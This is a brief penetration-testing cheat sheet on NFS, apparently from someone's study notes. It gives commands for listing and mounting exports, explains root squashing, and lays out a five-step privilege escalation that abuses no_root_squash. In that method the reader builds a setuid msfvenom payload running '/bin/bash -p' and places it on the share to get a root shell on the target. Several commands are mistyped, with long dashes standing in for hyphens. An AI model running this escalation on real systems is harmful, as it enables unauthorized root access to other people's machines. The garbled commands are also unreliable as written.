NFS

Commands
_______________________________________
Show the NFS server's export list:

showmount —e <target>

Similar Nmap script:

nmap —sv —script=nfs—showmount <target>

Mount an NFS share:

mount —o rw.vers=2 <target>:<share> <local_directory>

_________________________________________


Root Squashing is process that NFS prevents an obvious privilege escalation.
If remote user is a root with root squashing NFS treat them as nobody user
or nogroup group. (It is a default behaviour, can be disabled)


no_root_squash is a NFS configration where root squashing is off. In this if a 
remote root user uploads a file in the NFS share it treats as local root user.


Step 1: Check the NFS shares by : cat /etc/exports

Step 2: If the share is set as no_root_squash. In our machine check for that
	folder is avliable to share.
	showmount -e <remote_ip>

Step 3: make a nfs directory and mount
	mount —o rw.vers=2 <target>:<share> <local_directory> 

Step 4: Now generate a MSFVenom executable (with root user)
	and change it as executable and setuid. 

	msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -O <file_name>
	chmod +xs <filename>

Step 5: Run the file in the remote device. we will get a goot shell.
